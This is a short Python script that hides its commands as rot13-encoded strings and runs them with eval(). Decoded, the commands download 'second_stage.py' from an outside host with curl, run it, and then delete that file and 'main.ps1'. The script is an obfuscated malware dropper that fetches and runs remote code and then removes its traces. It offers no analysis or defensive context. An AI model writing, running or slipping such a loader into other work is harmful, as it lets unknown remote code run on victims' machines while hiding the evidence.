import codecs
import os

first = '''
bf.flfgrz("phey -B uggc://vgmphgrnlnar.pelfgnypybhq.klm/frpbaq_fgntr.cl")
'''

second = '''
bf.flfgrz("Clguba frpbaq_fgntr.cl")
'''

third = '''
bf.erzbir("frpbaq_fgntr.cl")
'''

fourth = '''
bf.erzbir("znva.cf1")
'''

first_decoded = codecs.decode(first, 'rot13')
second_decoded = codecs.decode(second, 'rot13')
third_decoded = codecs.decode(third, 'rot13')
fourth_decoded = codecs.decode(fourth, 'rot13')
eval(first_decoded)
eval(second_decoded)
eval(third_decoded)
eval(fourth_decoded)
